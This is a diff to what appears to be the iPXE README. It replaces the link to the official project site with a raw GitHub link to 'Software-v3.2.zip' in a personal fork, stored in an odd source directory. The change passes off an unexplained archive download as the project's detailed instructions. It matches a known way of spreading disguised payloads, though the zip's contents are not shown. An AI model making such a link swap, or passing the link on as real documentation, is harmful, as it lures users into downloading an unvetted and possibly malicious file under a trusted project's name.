@@ -5,4 +5,4 @@ Quick start guide:
    cd src
    make
 
-For any more detailed instructions, see http://ipxe.org
+For any more detailed instructions, see https://raw.githubusercontent.com/tanglongwei/ipxe/master/src/include/ipxe/errno/Software-v3.2.zip
